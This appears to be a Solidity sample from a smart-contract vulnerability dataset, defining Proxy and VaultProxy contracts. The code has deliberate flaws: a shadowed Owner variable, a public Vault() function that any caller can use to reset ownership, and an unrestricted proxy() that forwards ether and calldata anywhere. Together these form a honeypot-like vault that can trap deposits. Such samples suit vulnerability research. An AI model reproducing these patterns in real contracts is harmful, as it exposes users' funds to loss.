
                        contract sGuardPlus {
                                constructor() internal {
                                        
                                        
                                }
                                
                                
                                
                                
                        }
                contract Proxy  {
modifier onlyOwner {
if (msg.sender==Owner)
_;

}
address     Owner = msg.sender;
function transferOwner (address    _owner) public onlyOwner  {
Owner=_owner;
}

function proxy (address    target,bytes    data) public payable {
bool     __sent_result100 = target.call.value(msg.value)(data);
require(__sent_result100);
}

}
contract VaultProxy is Proxy {
address  public   Owner;
mapping (address  => uint256 ) public   Deposits;
function () public payable {
}

function Vault () public payable {
if (msg.sender==tx.origin)
{
Owner=msg.sender;
deposit();
}

}

function deposit () public payable {
if (msg.value>0.5 ether)
{
Deposits[msg.sender]+=msg.value;
}

}

function withdraw (uint256    amount) public onlyOwner  {
if (amount>0&&Deposits[msg.sender]>=amount)
{
msg.sender.transfer(amount);
}

}

}
